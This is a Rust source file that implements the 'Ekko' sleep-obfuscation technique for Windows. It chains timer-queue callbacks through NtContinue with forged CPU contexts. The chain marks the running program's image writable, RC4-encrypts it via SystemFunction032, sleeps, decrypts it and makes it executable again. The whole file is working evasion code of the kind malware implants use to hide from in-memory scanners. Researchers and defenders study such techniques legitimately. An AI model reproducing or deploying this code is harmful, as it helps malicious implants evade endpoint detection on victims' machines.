use std::{
    ffi::c_void,
    ptr::{null, null_mut},
};
use ntapi::winapi::shared::ntdef::PVOID;
use windows_sys::Win32::{
    Foundation::{GetLastError, HANDLE},
    System::{
        Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Memory::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
        SystemServices::IMAGE_DOS_HEADER,
        Threading::{
            CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue,
            WaitForSingleObject, WAITORTIMERCALLBACK, WT_EXECUTEINTIMERTHREAD,
        },
        WindowsProgramming::INFINITE,
    },
};

// https://doxygen.reactos.org/da/dab/structustring.html
#[repr(C)]
struct UString {
    length: u32,
    maximum_length: u32,
    buffer: PVOID,
}

// There is a bug in windows-rs/windows-sys and WINAPI: https://github.com/microsoft/win32metadata/issues/1044. Otherwise this is not needed.
#[derive(Clone, Copy)]
#[repr(align(16))]
struct ProperlyAlignedContext(pub CONTEXT);

impl core::ops::Deref for ProperlyAlignedContext {
    type Target = CONTEXT;
    fn deref(&self) -> &CONTEXT {
        &self.0
    }
}

impl core::ops::DerefMut for ProperlyAlignedContext {
    fn deref_mut(&mut self) -> &mut CONTEXT {
        &mut self.0
    }
}

pub fn ekko(sleep_time: u32, key_buf: &mut Vec<u8>) {
    let mut h_new_timer: HANDLE = 0;
    let mut old_protect: u32 = 0;

    // Creates or opens a named or unnamed event object.
    // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventw
    let h_event = unsafe { CreateEventW(null(), 0, 0, null()) };
    log::debug!("[+] h_event: {:#x}", h_event);

    if h_event == 0 {
        panic!("[!] CreateEventW failed with error: {}", unsafe { GetLastError() });
    }

    // Creates a queue for timers. Timer-queue timers are lightweight objects that enable you to specify a callback function to be called at a specified time.
    // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueue
    let h_timer_queue = unsafe { CreateTimerQueue() };
    log::debug!("[+] h_timer_queue: {:#x}", h_timer_queue);

    if h_timer_queue == 0 {
        panic!("[!] CreateTimerQueue failed with error: {}", unsafe { GetLastError() });
    }

    let image_base = unsafe { GetModuleHandleA(null_mut()) };
    let dos_header = image_base as *mut IMAGE_DOS_HEADER;
    let nt_headers = unsafe { (dos_header as u64 + (*dos_header).e_lfanew as u64) as *mut IMAGE_NT_HEADERS64 };
    let image_size = unsafe { (*nt_headers).OptionalHeader.SizeOfImage };

    log::debug!("[+] Image Base: {:#x}", image_base as u64);
    log::debug!("[+] Image Size: {:#x}", image_size as u64);

    //let mut key_buf: [u8; 16] = [0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55];
    let key = UString {
        length: key_buf.len() as u32,
        maximum_length: key_buf.len() as u32,
        buffer: key_buf.as_mut_ptr() as _,
    };

    let mut data = UString {
        length: image_size as u32,
        maximum_length: image_size as u32,
        buffer: image_base as _,
    };

    let rtl_capture_context = unsafe { GetProcAddress(LoadLibraryA("ntdll\0".as_ptr()), "RtlCaptureContext\0".as_ptr()).unwrap() as u64 };
    let rtl_capture_context_ptr = unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(rtl_capture_context) };

    let nt_continue = unsafe { GetProcAddress(GetModuleHandleA("ntdll\0".as_ptr()),"NtContinue\0".as_ptr()).unwrap() as u64 };
    let nt_continue_ptr = unsafe { std::mem::transmute::<_, WAITORTIMERCALLBACK>(nt_continue) };

    let system_function032 = unsafe { GetProcAddress(LoadLibraryA("Advapi32\0".as_ptr()), "SystemFunction032\0".as_ptr()).unwrap() as u64};
    let virtual_protect = unsafe { GetProcAddress(LoadLibraryA("kernel32.dll\0".as_ptr()), "VirtualProtect\0".as_ptr()).unwrap() as u64 };
    let wait_for_single_object = unsafe { GetProcAddress(LoadLibraryA("kernel32.dll\0".as_ptr()), "WaitForSingleObject\0".as_ptr()).unwrap() as u64 };
    let set_event = unsafe { GetProcAddress(LoadLibraryA("kernel32.dll\0".as_ptr()), "SetEvent\0".as_ptr()).unwrap() as u64 };

    log::debug!("[+] RtlCaptureContext: {:#x}", rtl_capture_context);
    log::debug!("[+] NtContinue: {:#x}", nt_continue);
    log::debug!("[+] SystemFunction032: {:#x}", system_function032);
    log::debug!("[+] VirtualProtect: {:#x}", virtual_protect);
    log::debug!("[+] WaitForSingleObject: {:#x}", wait_for_single_object);
    log::debug!("[+] SetEvent: {:#x}", set_event);

    log::debug!("[+] Calling CreateTimerQueueTimer with ctx_thread");

    // Contains processor-specific register data. The system uses CONTEXT structures to perform various internal operations.
    // https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context
    let ctx_thread = unsafe { std::mem::zeroed::<ProperlyAlignedContext>() };

    // Creates a timer-queue timer. This timer expires at the specified due time, then after every specified period. When the timer expires, the callback function is called.
    // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueuetimer
    let result = unsafe { CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, rtl_capture_context_ptr, &ctx_thread as *const _ as *const _, 0, 0, WT_EXECUTEINTIMERTHREAD) };

    if result != 0 {
        // Waits until the specified object is in the signaled state or the time-out interval elapses.
        // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
        unsafe { WaitForSingleObject(h_event, 0x32) };

        // Clone not required as it implements the copy trait
        let mut rop_prot_rw = ctx_thread;
        let mut rop_mem_enc = ctx_thread;
        let mut rop_delay = ctx_thread;
        let mut rop_mem_dec = ctx_thread;
        let mut rop_prot_rx = ctx_thread;
        let mut rop_set_evt = ctx_thread;

        // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
        rop_prot_rw.Rsp -= 8;
        rop_prot_rw.Rip = virtual_protect as u64;
        rop_prot_rw.Rcx = image_base as *const c_void as u64;
        rop_prot_rw.Rdx = image_size as u64;
        rop_prot_rw.R8 = PAGE_READWRITE as u64;
        rop_prot_rw.R9 = &mut old_protect as *mut _ as u64;
        dump_virtual_protect_context(&rop_prot_rw);

        // https://doxygen.reactos.org/df/d13/sysfunc_8c.html#a66d55017b8625d505bd6c5707bdb9725
        // NTSTATUS WINAPI SystemFunction032(struct ustring *data, const struct ustring *key)
        // pub unsafe extern "system" fn SystemFunction032(data: *mut UString, key: *const UString) -> NTSTATUS;
        rop_mem_enc.Rsp -= 8;
        rop_mem_enc.Rip = system_function032 as u64;
        rop_mem_enc.Rcx = &mut data as *mut _ as u64;
        rop_mem_enc.Rdx = &key as *const _ as u64;
        dump_system_function032_context(&rop_mem_enc);

        // pub unsafe extern "system" fn WaitForSingleObject(hhandle: HANDLE, dwmilliseconds: u32) -> WIN32_ERROR
        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.WaitForSingleObject.html
        rop_delay.Rsp -= 8;
        rop_delay.Rip = wait_for_single_object as u64;
        rop_delay.Rcx = -1 as isize as u64; // NtCurrentProcess
        rop_delay.Rdx = sleep_time as u64;
        dump_wait_for_single_object_context(&rop_delay);

        // https://doxygen.reactos.org/df/d13/sysfunc_8c.html#a66d55017b8625d505bd6c5707bdb9725
        // NTSTATUS WINAPI SystemFunction032(struct ustring *data, const struct ustring *key)
        // pub unsafe extern "system" fn SystemFunction032(data: *mut UString, key: *const UString) -> NTSTATUS;
        rop_mem_dec.Rsp -= 8;
        rop_mem_dec.Rip = system_function032 as u64;
        rop_mem_dec.Rcx = &mut data as *mut _ as u64;
        rop_mem_dec.Rdx = &key as *const _ as u64;
        dump_system_function032_context(&rop_mem_dec);

        // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
        rop_prot_rx.Rsp -= 8;
        rop_prot_rx.Rip = virtual_protect as u64;
        rop_prot_rx.Rcx = image_base as *const c_void as u64;
        rop_prot_rx.Rdx = image_size as u64;
        rop_prot_rx.R8 = PAGE_EXECUTE_READWRITE as u64;
        rop_prot_rx.R9 = &mut old_protect as *mut _ as u64;
        dump_virtual_protect_context(&rop_prot_rx);

        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.SetEvent.html
        // pub unsafe extern "system" fn SetEvent(hevent: HANDLE) -> BOOL
        rop_set_evt.Rsp -= 8;
        rop_set_evt.Rip = set_event as u64;
        rop_set_evt.Rcx = h_event as u64;
        dump_set_event_context(&rop_set_evt);

        println!("[+] Queue timers");
        unsafe 
        {
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_prot_rw as *const _ as *const _, 100, 0, WT_EXECUTEINTIMERTHREAD);
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_mem_enc as *const _ as *const _, 200, 0, WT_EXECUTEINTIMERTHREAD);
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_delay as *const _ as *const _, 300, 0, WT_EXECUTEINTIMERTHREAD);
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_mem_dec as *const _ as *const _, 400, 0, WT_EXECUTEINTIMERTHREAD);
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_prot_rx as *const _ as *const _, 500,0, WT_EXECUTEINTIMERTHREAD);
            CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, nt_continue_ptr, &rop_set_evt as *const _ as *const _,  600, 0, WT_EXECUTEINTIMERTHREAD);
    
            println!("[+] Wait for hEvent");

            WaitForSingleObject(h_event, INFINITE); //0xFFFFFFFF

            println!("[+] Finished waiting for event");
        }
    }

    // Deletes a timer queue. Any pending timers in the queue are canceled and deleted.
    // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-deletetimerqueue
    unsafe { DeleteTimerQueue(h_timer_queue) };
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    if cfg!(debug_assertions) {
        match get_input() {
            Ok(buffer) => println!("{:?}", buffer),
            Err(error) => println!("error: {}", error),
        };
    }
}

fn dump_virtual_protect_context(rop: &ProperlyAlignedContext) {
    if cfg!(debug_assertions) {
        log::debug!(
            "[+] RSP: {:#x} RIP: {:#x} -> VirtualProtect({:#x}, {:#x}, {:#x}, {:#x})",
            rop.Rsp,
            rop.Rip,
            rop.Rcx,
            rop.Rdx,
            rop.R8,
            rop.R9
        );
    }
}

fn dump_system_function032_context(rop: &ProperlyAlignedContext) {
    if cfg!(debug_assertions) {
        log::debug!(
            "[+] RSP: {:#x} RIP: {:#x} -> SystemFunction032({:#x}, {:#x})",
            rop.Rsp,
            rop.Rip,
            rop.Rcx,
            rop.Rdx
        );
    }
}

fn dump_wait_for_single_object_context(rop: &ProperlyAlignedContext) {
    if cfg!(debug_assertions) {
        log::debug!(
            "[+] RSP: {:#x} RIP: {:#x} -> WaitForSingleObject({:#x}, {:#x})",
            rop.Rsp,
            rop.Rip,
            rop.Rcx,
            rop.Rdx
        );
    }
}

fn dump_set_event_context(rop: &ProperlyAlignedContext) {
    if cfg!(debug_assertions) {
        log::debug!(
            "[+] RSP: {:#x} RIP: {:#x} -> SetEvent({:#x})",
            rop.Rsp,
            rop.Rip,
            rop.Rcx
        );
    }
}
